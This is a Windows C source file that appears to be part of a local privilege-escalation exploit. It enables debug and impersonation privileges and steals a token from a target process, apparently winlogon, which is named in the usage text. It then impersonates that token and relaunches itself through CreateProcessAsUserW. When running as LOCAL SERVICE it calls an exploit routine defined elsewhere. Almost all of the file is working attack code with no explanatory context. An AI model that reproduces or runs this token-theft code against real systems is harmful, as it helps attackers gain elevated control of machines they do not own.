#include <windows.h>
#include <sddl.h>
#include <stdio.h>
#include <stdint.h>
#include "Common.h"

pNtAdjustPrivilegesToken NtAdjustPrivilegesToken = NULL;
pNtOpenProcessToken NtOpenProcessToken = NULL;
pNtOpenProcess NtOpenProcess = NULL;
pNtWriteVirtualMemory NtWriteVirtualMemory = NULL;
pNtDuplicateToken NtDuplicateToken = NULL;
pNtSetInformationThread NtSetInformationThread = NULL;
pNtQueryInformationToken NtQueryInformationToken = NULL;
pNtClose NtClose = NULL;
pNtDeviceIoControlFile NtDeviceIoControlFile = NULL;
pNtCreateFile NtCreateFile = NULL;
pNtQuerySystemInformation NtQuerySystemInformation = NULL;
pRtlInitUnicodeString RtlInitUnicodeString = NULL;
pRtlGetVersion RtlGetVersion = NULL;

HANDLE currentProcessHandle = ((HANDLE)(LONG_PTR)-1);
HANDLE currentThreadHandle = ((HANDLE)(LONG_PTR)-2);

void stealToken(HANDLE* duplicateTokenHandleOut, int64_t dwPid);

int init_ntdll()
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll");
    if (hNtdll == NULL)
    {
        wprintf(L"[!] Failed to load ntdll.dll! (Error code: %d)\n", GetLastError());
        return 0;
    }

    RtlGetVersion = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
    NtAdjustPrivilegesToken = (pNtAdjustPrivilegesToken)GetProcAddress(hNtdll, "NtAdjustPrivilegesToken");
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtOpenProcessToken = (pNtOpenProcessToken)GetProcAddress(hNtdll, "NtOpenProcessToken");
    NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    NtDuplicateToken = (pNtDuplicateToken)GetProcAddress(hNtdll, "NtDuplicateToken");
    NtSetInformationThread = (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");
    NtQueryInformationToken = (pNtQueryInformationToken)GetProcAddress(hNtdll, "NtQueryInformationToken");
    NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");

    NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
    NtCreateFile = (pNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
    NtDeviceIoControlFile = (pNtDeviceIoControlFile)GetProcAddress(hNtdll, "NtDeviceIoControlFile");

    if (!NtAdjustPrivilegesToken && !NtOpenProcess && !NtDuplicateToken && !NtOpenProcessToken 
        && !NtSetInformationThread && !NtQueryInformationToken && !NtClose &&
        !NtQuerySystemInformation && !RtlInitUnicodeString && !NtCreateFile && !NtDeviceIoControlFile && !RtlGetVersion && !NtWriteVirtualMemory)
    {
        wprintf(L"[!] Failed to resolve ntdll functions\n");
        return 0;
    }

    return 1;
}

void spawnShell(HANDLE duplicatedTokenHandle, int64_t dwPid)
{
    WCHAR selfPath[MAX_PATH] = { 0 };
    if (!GetModuleFileNameW(NULL, selfPath, 100)) {
        wprintf(L"Failed to get module file name.\n");
        return -1;
    }
    WCHAR cmdLine[MAX_PATH] = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };

    if (dwPid != 0)
    {   
        if (swprintf_s(cmdLine, MAX_PATH, L"%s %lld 0", selfPath, dwPid) == -1) {
            wprintf(L"ERROR: Failed to format command line.\n");
            return -1;
        }
    }
    else
    {
        if (wcscpy_s(cmdLine, MAX_PATH, selfPath) != 0) {
            wprintf(L"ERROR: Failed to copy selfPath to cmdLine.\n");
            return -1;
        }
    }

    // Set up STARTUPINFO
    si.cb = sizeof(si);
    si.lpDesktop = L"Winsta0\\Default";
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    // This will fail with ACCESS_DENIED if the local service doesn't have the permissions to access the directory
    BOOL bResult = CreateProcessAsUserW(
        duplicatedTokenHandle,
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!bResult) {
        wprintf(L"CreateProcessAsUserW failed with error %ld\n", GetLastError());
    }
    else {
        wprintf(L"Process created successfully.\n");
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

BOOL IsRunningAsSystem() {
    HANDLE tokenHandle = NULL;
    NTSTATUS status;
    PTOKEN_USER pTokenUser = NULL;
    ULONG dwSize = 0;
    LPWSTR sidString = NULL;
    BOOL result = FALSE;

    status = NtOpenProcessToken(currentProcessHandle, TOKEN_QUERY, &tokenHandle);
    if (status != 0) {
        wprintf(L"NtOpenProcessToken failed. Status: 0x%x\n", status);
        return FALSE;
    }

    status = NtQueryInformationToken(tokenHandle, TokenUser, NULL, 0, &dwSize);
    if (status != 0xC0000023) {
        wprintf(L"NtQueryInformationToken (1) failed. Status: 0x%x\n", status);
        NtClose(tokenHandle);
        return FALSE;
    }

    pTokenUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pTokenUser) {
        wprintf(L"HeapAlloc failed.\n");
        NtClose(tokenHandle);
        return FALSE;
    }

    status = NtQueryInformationToken(tokenHandle, TokenUser, pTokenUser, dwSize, &dwSize);
    if (status != 0) {
        wprintf(L"NtQueryInformationToken (2) failed. Status: 0x%x\n", status);
        HeapFree(GetProcessHeap(), 0, pTokenUser);
        NtClose(tokenHandle);
        return FALSE;
    }

    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &sidString)) {
        wprintf(L"ConvertSidToStringSidW failed.\n");
        HeapFree(GetProcessHeap(), 0, pTokenUser);
        NtClose(tokenHandle);
        return FALSE;
    }

    // NT AUTHORITY\LOCAL SERVICE
    if (_wcsicmp(sidString, L"S-1-5-19") == 0) {
        result = TRUE;
    }

    LocalFree(sidString);
    HeapFree(GetProcessHeap(), 0, pTokenUser);
    NtClose(tokenHandle);

    return result;
}

int wmain(int argc, wchar_t* argv[])
{    
    if (!init_ntdll())
    {
        return -1;
    }

    if (IsRunningAsSystem()) {
        wprintf(L"The process is running as NT AUTHORITY\\LOCAL SERVICE.\n");
        exploit();
        ExitProcess(0);
    }
    else {
        wprintf(L"The process is not running as NT AUTHORITY\\LOCAL SERVICE.\n");

        if (3 != argc)
        {
            wprintf(L"Usage: %ls <winlogon PID> <service PID>", argv[0]);
            return -1;
        }

        HANDLE duplicatedTokenHandle = NULL;
        int64_t dwPid = 0;
        int64_t dwPid2 = 0;
        dwPid = _wtoi(argv[1]);
        dwPid2 = _wtoi(argv[2]);
        if (!dwPid && !dwPid2)
        {
            wprintf(L"PIDs must be numeric.\r\n");
            return -2;
        }
        wprintf(L"[+] Stealing token from process #%lld.\r\n", dwPid);
        stealToken(&duplicatedTokenHandle, dwPid);
        if (!duplicatedTokenHandle)
        {
            wprintf(L"Token stealing failed.\r\n");
            return -3;
        }
        spawnShell(duplicatedTokenHandle, dwPid2);
    }
    
    return 0;
}

void stealToken(HANDLE* duplicateTokenHandleOut, int64_t dwPid)
{
    HANDLE targetProcessHandle = NULL;
    HANDLE duplicatedTokenHandle = NULL;
    HANDLE currentTokenHandle = NULL;
    NTSTATUS Status;
    TOKEN_PRIVILEGES tp;

    Status = NtOpenProcessToken(currentProcessHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentTokenHandle);
    CHECK_STATUS(L"NtOpenProcessToken() returned ", Status);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.HighPart = 0;
    tp.Privileges[0].Luid.LowPart = LUID_SE_DEBUG;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    Status = NtAdjustPrivilegesToken(currentTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
    if(Status != STATUS_NOT_ALL_ASSIGNED)
        CHECK_STATUS(L"NtAdjustPrivilegesToken() #1 returned ", Status);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.HighPart = 0;
    tp.Privileges[0].Luid.LowPart = LUID_SE_IMPERSONATE;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    Status = NtAdjustPrivilegesToken(currentTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
    if (Status != STATUS_NOT_ALL_ASSIGNED)
        CHECK_STATUS(L"NtAdjustPrivilegesToken() #2 returned ", Status);

    DWORD dwDesiredAccess;
    OBJECT_ATTRIBUTES Obja;
    CLIENT_ID ClientId;

    dwDesiredAccess = PROCESS_QUERY_INFORMATION;
    ClientId.UniqueThread = NULL;
    ClientId.UniqueProcess = (HANDLE)(dwPid);
    InitializeObjectAttributes(&Obja, NULL, 0, NULL, NULL, NULL);

    Status = NtOpenProcess(&targetProcessHandle, dwDesiredAccess, &Obja, &ClientId); // Cannot access PPL processes
    CHECK_STATUS(L"NtOpenProcess() returned ", Status);

    HANDLE targetTokenHandle = NULL;

    Status = NtOpenProcessToken(
        targetProcessHandle,
        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
        &targetTokenHandle);
    CHECK_STATUS(L"NtOpenProcessToken() returned ", Status);

    OBJECT_ATTRIBUTES Obja2;
    SECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;

    SecurityQualityOfService.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
    SecurityQualityOfService.ImpersonationLevel = SecurityImpersonation;
    SecurityQualityOfService.ContextTrackingMode = FALSE;
    SecurityQualityOfService.EffectiveOnly = FALSE;
    InitializeObjectAttributes(&Obja2, NULL, 0, NULL, NULL, &SecurityQualityOfService);

    Status = NtDuplicateToken(
        targetTokenHandle,
        MAXIMUM_ALLOWED,
        &Obja2,
        FALSE,
        TokenImpersonation,
        &duplicatedTokenHandle);
    CHECK_STATUS(L"NtDuplicateToken() returned ", Status);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.HighPart = 0;
    tp.Privileges[0].Luid.LowPart = LUID_SE_ASSIGNPRIMARYTOKEN;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    Status = NtAdjustPrivilegesToken(duplicatedTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
    if(Status != STATUS_NOT_ALL_ASSIGNED)
        CHECK_STATUS(L"NtAdjustPrivilegesToken() #1 returned ", Status);

    Status = NtSetInformationThread(
        currentThreadHandle,
        ThreadImpersonationToken,
        (PVOID)&duplicatedTokenHandle,
        sizeof(duplicatedTokenHandle));
    CHECK_STATUS(L"NtSetInformationThread() returned ", Status);

    *duplicateTokenHandleOut = duplicatedTokenHandle;
}